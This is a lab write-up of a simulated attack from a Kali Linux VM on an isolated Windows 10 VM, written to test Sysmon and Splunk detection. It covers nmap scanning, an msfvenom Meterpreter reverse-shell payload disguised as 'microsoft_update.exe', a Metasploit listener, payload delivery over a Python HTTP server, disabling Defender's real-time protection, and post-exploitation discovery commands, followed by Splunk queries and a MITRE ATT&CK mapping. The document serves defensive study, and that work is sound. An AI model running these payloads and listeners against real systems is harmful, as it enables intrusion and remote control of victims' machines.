# Attack Walkthrough

This is document details the simulated attack from the **Kali Linux Attacker VM** to the **Windows 10 Victim VM**, including payload delivery, successful compromise, command execution, and detection in **Splunk**.

**Lab Context**
- Attacker: Kali Linux VM - IP: `192.168.20.11`
- Victim: Windows 10 VM with **Sysmon** + **Splunk Enterprise** - IP: `192.168.20.12`
- Network: Isolated VirtualBox [`Internal`] Network
- Goal: Simulate a realistic attack chain and validate detection capabilities

**⚠️ Important Notes**
- All activities were performed in an **isolated lab environment** with no internet access to the victim during testing. 
- No real malware was used - only safe, educational payloads for demonstration. 
- Take a VM snapshot before starting the attack

## 1. Preparation on Attacker (Kali Linux)

1. Scan the ports and information of the target machine
```bash
nmap -A -Pn -n 192.168.20.12
```
![Scanned OS Information](../screenshots/attacker_side/os-info-scan.png)

2. List the available payloads and create one for exploit
    ```bash
    msfvenom -l payloads
    ```
![List the payloads](../screenshots/attacker_side/list_the_payloads.png)

```bash
msfvenom -p windows/c64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=3344 -f exe -o microsoft_update.exe
```
![Payload Created](../screenshots/attacker_side/payload_created.png)

3. Set up a listener
```bash
msfconsole

msf> use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 

msf exploit(multi/handler) > set lhost 192.168.20.11
msf exploit(multi/handler) > exploit
```

![Listener setup](../screenshots/attacker_side/listener_setup.png)

4. Set up http server
Open another terminal in Linux and use python to establish a temporary server
*Note: Make sure the new terminal is under the same directory as the payload. Use `ls` to verify

```bash
python3 -m http.server 9999
```
![HTTP server set up](../screenshots/attacker_side/http_server.png)

## 2. Delivery and Execution on Windows 10 Victim
1. Turn of the Firewall on Windows 10 
    - Find the search box of Taskbar
    - Type `Windows Security`
    - Click `Virus & threat Protection`
    - Click `Manage Settings`
    - Turn off the `Real-time protection`

![Realtime protection turned off](../screenshots/victim_side/realtime_protection_off.png)

2. Download the malware from Attacker
    - Open `Microsoft Edge` browser
    - Type `192.168.20.11:9999`
    - Click `microsoft_update.exe` for download 

![Malware downloaded](../screenshots/victim_side/malware_downloaded.png)

3. Malware Execution
    - Double Click `Downloads/microsoft_update.exe` in Windows
    - Click `Run` if prompt `SmartScreen can't be reached right now`
    - Open `Command Prompt` with administrator privilege
    - Type the following command
```bash
C:\Windows\system32>nestat -anob
```
![Malware Running](../screenshots/victim_side/malware_running_verification.png)

## 3. Post-Exploitation / Command & Control
When the malware is executed successfully, a reverse shell can be opened for command and control in Kali. 
Go back to Kali, Meterpreter is ready for ongoing invasion. The following commands were executed in the reverse shell 
```bash
shell

whoami
ipconfig
systeminfo
net user
net localgroup
```
## 4. Detection in Splunk
    1. Open `Microsoft Edge` browser and type `localhost:8000` in the address bar
    2. Login with `Username` and `Password`
    3. Click `Search & Reporting`
    4. Input `Index=endpoint microsoft_update.exe` in the search bar

![Splunk Search Bar](../screenshots/victim_side/search_bar_ms_u_exe.png)

    5. Find `EventCode` from the left column and click the value `1`. The EventCode condition will be added into the search bar and the result will be updated. 

![Eventcode Added](../screenshots/victim_side/eventcode_added.png)

    6. Collapse the first result -> find `process_guid` or`ProcessGUID`(unique identifier of program) -> Update the search bar with 
    
    `index=endpoint [process_guid](copy & paste from event) | table _time, ParentImage, Image, CommandLine`

![Executed Commands Found](../screenshots/victim_side/final_search_result.png)

## 5. MITRE ATT&CK Mapping
To align this simulation with industry standards, the following attack behaviors have been mapped to the `MITRE ATT&CK Framework` Mapping these techniques ensures that the detection strategies developed in Splunk are categorized against known adversary tactics, providing a structured approach to threat hunting and control validation. 

| Tactics | Technique ID | Description | Observed in Lab | 
| ------- | ------------ | -------------- | ---------------- |
| Initial Access| T1566 | Phishing | Delivery of malicious payload via simulated user download. |
| Execution | T1059.003 | Windows Command Shell | Execution of the reverse shell payload on the Windows host (e.g. "shell" command in Meterpreter). |
| Command & Control | T1071.001 | Reverse Shell | A series of commands were executed for harvesting information of the victim machine. |
| Discovery | T1087.001, T1040, T1069.001, T1082, T1033| Commands executed, such as "whoami", "systeminfo" and "net user"| Post-Exploitation |